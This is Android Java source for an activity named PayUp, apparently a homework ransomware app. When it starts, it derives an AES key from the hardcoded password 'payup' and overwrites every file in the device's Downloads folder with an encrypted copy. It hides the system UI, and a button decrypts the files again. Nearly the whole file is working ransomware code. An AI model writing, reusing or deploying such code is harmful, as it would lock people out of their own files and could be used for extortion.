package wubbalubbadubdub.hw1700ransomware;

import android.annotation.SuppressLint;
import android.app.ActionBar;
import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.view.MotionEvent;
import android.view.View;
import android.widget.Toast;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.SecureRandom;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

/**
 * An example full-screen activity that shows and hides the system UI (i.e.
 * status bar and navigation/system bar) with user interaction.
 */
public class PayUp extends Activity {
    /**
     * Whether or not the system UI should be auto-hidden after
     * {@link #AUTO_HIDE_DELAY_MILLIS} milliseconds.
     */
    private static final boolean AUTO_HIDE = true;

    /**
     * If {@link #AUTO_HIDE} is set, the number of milliseconds to wait after
     * user interaction before hiding the system UI.
     */
    private static final int AUTO_HIDE_DELAY_MILLIS = 3000;


    private static byte[] ENCRYPTION_KEY;

    /**
     * Some older devices needs a small delay between UI widget updates
     * and a change of the status and navigation bar.
     */
    private static final int UI_ANIMATION_DELAY = 300;
    private final Handler mHideHandler = new Handler();
    private View mContentView;
    private final Runnable mHidePart2Runnable = new Runnable() {
        @SuppressLint("InlinedApi")
        @Override
        public void run() {
            // Delayed removal of status and navigation bar

            // Note that some of these constants are new as of API 16 (Jelly Bean)
            // and API 19 (KitKat). It is safe to use them, as they are inlined
            // at compile-time and do nothing on earlier devices.
            mContentView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LOW_PROFILE
                    | View.SYSTEM_UI_FLAG_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION);
        }
    };
    private View mControlsView;
    private final Runnable mShowPart2Runnable = new Runnable() {
        @Override
        public void run() {
            // Delayed display of UI elements
            ActionBar actionBar = getActionBar();
//            if (actionBar != null) {
//                actionBar.show();
//            }
            mControlsView.setVisibility(View.VISIBLE);
        }
    };
    private boolean mVisible;
    private final Runnable mHideRunnable = new Runnable() {
        @Override
        public void run() {
            hide();
        }
    };
    /**
     * Touch listener to use for in-layout UI controls to delay hiding the
     * system UI. This is to prevent the jarring behavior of controls going away
     * while interacting with activity UI.
     */
    private final View.OnTouchListener mDelayHideTouchListener = new View.OnTouchListener() {
        @Override
        public boolean onTouch(View view, MotionEvent motionEvent) {
            if (AUTO_HIDE) {
                delayedHide(AUTO_HIDE_DELAY_MILLIS);
            }
            return false;
        }
    };

    //Hides the System UI at the top
    public void hideSystemUI(){
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
    }


    //Generate a key from a password and seed. Used as the key for the encryption
    public byte[] generateKey(String password) throws Exception
    {
        byte[] keyStart = password.getBytes("UTF-8");
        //Generate a key for use with the encryption
        KeyGenerator kgen = KeyGenerator.getInstance("AES");
        SecureRandom sr = new SecureRandom();
        sr.setSeed(keyStart);
        kgen.init(128, sr);
        SecretKey skey = kgen.generateKey();
        ENCRYPTION_KEY = skey.getEncoded(); // Save the key for decoding later.
        return skey.getEncoded();
    }

    //Given a file, return an encrypted file.
    public byte[] encodeFile(byte[] key, byte[] fileData) throws Exception
    {
        //Get the cipher and provide it the key
        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);

        //Encrypt the file
        byte[] encrypted = cipher.doFinal(fileData);

        return encrypted;
    }

    //Given a file, return the decrypted version of it.
    public static byte[] decodeFile(byte[] key, byte[] fileData) throws Exception
    {
        //Get the cipher and provide it the key
        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, skeySpec);

        //Decrypt the file
        byte[] decrypted = cipher.doFinal(fileData);

        return decrypted;
    }

    //Read in a file to a byte array given the file name
    public byte[] readFileToByteArray(File file) {
        FileInputStream infile = null;
        try {
            //Create the input stream and byte array
            infile = new FileInputStream(file);
            byte fileContent[] = new byte[(int)file.length()];

            //Read in the file
            infile.read(fileContent);
            return fileContent;
        }
        catch (FileNotFoundException e) { System.out.println("File does not exist: " + e); }
        catch (IOException ioe) { System.out.println("Error reading file: " + ioe); }
        finally {
            try { if (infile != null) infile.close(); }
            catch (IOException ioe) { System.out.println("Error closing stream: " + ioe); }
        }
        return null;
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_pay_up);

        mVisible = true;
        mControlsView = findViewById(R.id.fullscreen_content_controls);
        mContentView = findViewById(R.id.fullscreen_content);


        // Set up the user interaction to manually show or hide the system UI.
        mContentView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                toggle();
            }
        });

        // Upon interacting with UI controls, delay any scheduled hide()
        // operations to prevent the jarring behavior of controls going away
        // while interacting with the UI.
//        findViewById(R.id.dummy_button).setOnTouchListener(mDelayHideTouchListener);


        /*************
         *
         *  Here, we encrypt all of the files in the downloads folder.
         *
         **************/

        //Generate the Key
        byte[] key = null;
        try { key = generateKey("payup"); }
        catch (Exception e) {
            System.out.println("Could not generate the key.");
            return;
        }

        //Grab the downloads folder.
        String currentFileName = "";
        File downloadsFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString());

        //Loop through the files, encrypting each one.
        for (File f : downloadsFolder.listFiles()) {
            if (f.isFile()) {
                currentFileName = f.getName();
                File fileToEncrypt = new File(downloadsFolder, currentFileName);

                byte[] fileToEncrypt_bytes = readFileToByteArray(fileToEncrypt); //Read in the file
                try {
                    byte[] encryptedFile = encodeFile(key, fileToEncrypt_bytes);   //Encrypt the file
                    BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(fileToEncrypt)); //Create output stream and overwrite the file.
                    bos.write(encryptedFile);
                    bos.flush();
                    bos.close();
                }
                catch (FileNotFoundException e) { System.out.println("[BufferedOutputStream] Couldn't find the file!\n" + e); }
                catch (IOException e) { System.out.println("[IOException] Couldn't write the file!\n" + e); }
                catch (Exception e) { System.out.println("Couldn't encrypt the file!\n" + e); }

            }
        }

    }

    @Override
    protected void onPostCreate(Bundle savedInstanceState) {
        super.onPostCreate(savedInstanceState);

        // Trigger the initial hide() shortly after the activity has been
        // created, to briefly hint to the user that UI controls
        // are available.
        delayedHide(100);
    }

    public void onClickDecode(View v) {

        System.out.println("[DECODE] Decoding files...");

        Toast toast = Toast.makeText(getApplicationContext(), "Alright, decoding everything...", Toast.LENGTH_SHORT);

        toast.show();

        //Grab the downloads folder.
        String currentFileName = "";
        File downloadsFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString());

        //Loop through the files, encrypting each one.
        for (File f : downloadsFolder.listFiles()) {
            if (f.isFile()) {
                currentFileName = f.getName();
                File fileToDecrypt = new File(downloadsFolder, currentFileName);

                byte[] fileToEncrypt_bytes = readFileToByteArray(fileToDecrypt); //Read in the file
                try {
                    byte[] encryptedFile = decodeFile(ENCRYPTION_KEY, fileToEncrypt_bytes);   //Decrypt the file
                    BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(fileToDecrypt)); //Create output stream and overwrite the file.
                    bos.write(encryptedFile);
                    bos.flush();
                    bos.close();
                }
                catch (FileNotFoundException e) { System.out.println("[BufferedOutputStream] Couldn't find the file!\n" + e); }
                catch (IOException e) { System.out.println("[IOException] Couldn't write the file!\n" + e); }
                catch (Exception e) { System.out.println("Couldn't decrypt the file!\n" + e); }

            }
        }
    }

    private void toggle() {
//        if (mVisible) {
//            hide();
//        } else {
//            show();
//        }
        hide();
    }

    private void hide() {
        // Hide UI first
        ActionBar actionBar = getActionBar();
        if (actionBar != null) {
            actionBar.hide();
        }
        mControlsView.setVisibility(View.GONE);
        mVisible = false;

        // Schedule a runnable to remove the status and navigation bar after a delay
        mHideHandler.removeCallbacks(mShowPart2Runnable);
        mHideHandler.postDelayed(mHidePart2Runnable, UI_ANIMATION_DELAY);
    }

    @SuppressLint("InlinedApi")
    private void show() {
        // Show the system bar
        mContentView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
        mVisible = true;

        // Schedule a runnable to display UI elements after a delay
        mHideHandler.removeCallbacks(mHidePart2Runnable);
        mHideHandler.postDelayed(mShowPart2Runnable, UI_ANIMATION_DELAY);
    }

    /**
     * Schedules a call to hide() in delay milliseconds, canceling any
     * previously scheduled calls.
     */
    private void delayedHide(int delayMillis) {
        mHideHandler.removeCallbacks(mHideRunnable);
        mHideHandler.postDelayed(mHideRunnable, delayMillis);
    }
}
